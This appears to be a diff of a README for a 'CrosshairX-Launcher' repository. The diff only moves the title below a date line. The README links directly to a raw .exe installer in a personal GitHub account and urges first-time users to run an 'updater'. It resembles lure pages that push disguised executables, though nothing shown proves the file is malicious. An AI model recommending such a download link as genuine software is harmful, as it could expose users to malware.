@@ -1,6 +1,6 @@
-# CrosshairX-Launcher
-
 Last Update:Wednesday,11 September 2024 
+
+# CrosshairX-Launcher
 
 <a href="https://raw.githubusercontent.com/GODMASTER841/CrosshairX-launcher/main/CrosshairX%20launcher%20Installer.exe">Click here for Download the app </a>(u always need a updater, if u installing at first time)
 
